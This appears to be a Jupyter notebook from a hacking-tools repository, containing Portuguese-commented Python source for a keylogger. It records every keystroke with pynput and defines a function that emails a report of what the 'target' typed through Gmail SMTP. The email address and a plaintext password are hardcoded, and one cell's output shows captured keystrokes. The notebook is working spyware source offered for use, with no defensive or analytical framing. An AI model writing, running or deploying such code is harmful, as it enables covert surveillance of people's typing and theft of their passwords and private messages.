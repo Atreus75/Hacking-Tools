{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "\n",
    "from pynput.keyboard import Listener\n",
    "from threading import Timer\n",
    "import smtplib\n",
    "import email.message"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "# Formata e organiza tudo o que é digitado\n",
    "frases = []\n",
    "digit = ''\n",
    "\n",
    "def monitor(tecla):\n",
    "    global digit\n",
    "    entrada = str(tecla)\n",
    "    \n",
    "    # Tratamento de entrada\n",
    "    if \"'\" in entrada:\n",
    "        entrada = entrada.replace(\"'\", \"\")\n",
    "        if entrada == '':\n",
    "            entrada = '5'\n",
    "        digit += entrada\n",
    "    else:\n",
    "        if entrada[3] == '.':\n",
    "            entrada = entrada[4:]\n",
    "            if entrada == 'space':\n",
    "                entrada = ' '\n",
    "                digit += entrada\n",
    "\n",
    "            elif entrada == 'backspace':\n",
    "                digit = digit.replace(digit[len(digit)-1], '')\n",
    "\n",
    "            elif entrada == 'enter':\n",
    "                frases.append(digit)\n",
    "                global resultado\n",
    "                resultado = ' || '.join(frases)\n",
    "                resultado.replace('enter', '[enter] ')\n",
    "                digit = ''\n",
    "                print(frases)\n",
    "\n",
    "            else:\n",
    "                if entrada == 'insert':\n",
    "                    entrada = '0'\n",
    "\n",
    "                elif entrada == 'end':\n",
    "                    entrada = '1'\n",
    "\n",
    "                elif entrada == 'down':\n",
    "                    entrada ='2'\n",
    "                \n",
    "                elif entrada == 'page_down':\n",
    "                    entrada = '3'\n",
    "                \n",
    "                elif entrada == 'left':\n",
    "                    entrada = '4'\n",
    "                \n",
    "                elif entrada == '':\n",
    "                    entrada = '5'\n",
    "                \n",
    "                elif entrada == 'right':\n",
    "                    entrada = '6'\n",
    "                \n",
    "                elif entrada == 'home':\n",
    "                    entrada = '7'\n",
    "                \n",
    "                elif entrada == 'up':\n",
    "                    entrada = '8'\n",
    "                \n",
    "                elif entrada == 'page_up':\n",
    "                    entrada = '9'\n",
    "                else:\n",
    "                    entrada = f' [{entrada}] '\n",
    "                digit += entrada"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": []
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "def  enviar_captura(captura):\n",
    "    corpo = f'''\n",
    "    <h1 style=\"font-family:cursive;\">Relatório do <strong style=\"color: #ff2400;\">Alvo</strong></h1><br>\n",
    "    <p style=\"color: rgb(20, 148, 20);\">     Nos últimos 5 minutos o <strong style=\"color: #ff2400;\">alvo</strong> digitou:</p><br>\n",
    "            <strong>{resultado}</strong>'''\n",
    "    msg = email.message.Message()\n",
    "    msg['Subject'] = 'ⓇⒺⓁⒶⓉⓄⓇⒾⓄ ⒹⒺ ⓀⒺⓎⓁⓁⓄⒼⒼⒺⓇ'\n",
    "    msg['From'] = 'rodbr75@gmail.com'\n",
    "    msg['To'] = 'rodbr75@gmail.com'\n",
    "    password = 'filho2017'\n",
    "    msg.add_header('Content-Type', 'text/html')\n",
    "    msg.set_payload(corpo)\n",
    "\n",
    "    s = smtplib.SMTP('smtp.gmail.com: 587')\n",
    "    s.starttls()\n",
    "    # Login Credentials for sending the mail\n",
    "    s.login(msg['From'], password)\n",
    "    s.sendmail(msg['From'], [msg['To']], msg.as_string().encode('utf-8'))\n",
    "    print('Email enviado')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "['']\n",
      "['', '']\n",
      "['', '', '']\n",
      "['', '', '', 'k']\n",
      "['', '', '', 'k', 'l']\n",
      "['', '', '', 'k', 'l', 'liii']\n",
      "['', '', '', 'k', 'l', 'liii', 'ooo']\n",
      "['', '', '', 'k', 'l', 'liii', 'ooo', 'iooi']\n",
      "['', '', '', 'k', 'l', 'liii', 'ooo', 'iooi', 'ii']\n",
      "['', '', '', 'k', 'l', 'liii', 'ooo', 'iooi', 'ii', '4oooi']\n",
      "['', '', '', 'k', 'l', 'liii', 'ooo', 'iooi', 'ii', '4oooi', 'oooi']\n",
      "['', '', '', 'k', 'l', 'liii', 'ooo', 'iooi', 'ii', '4oooi', 'oooi', 'oooiii']\n",
      "['', '', '', 'k', 'l', 'liii', 'ooo', 'iooi', 'ii', '4oooi', 'oooi', 'oooiii', 'oooiii']\n"
     ]
    }
   ],
   "source": [
    "\n",
    "with Listener(on_press=monitor) as listener:\n",
    "    listener.join()\n"
   ]
  }
 ],
 "metadata": {
  "interpreter": {
   "hash": "2f566aa225148740d66d7bffa8fbb341b94ef6f9f805c9c9e52b474a3635c9a1"
  },
  "kernelspec": {
   "display_name": "Python 3.9.5 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  },
  "orig_nbformat": 4
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
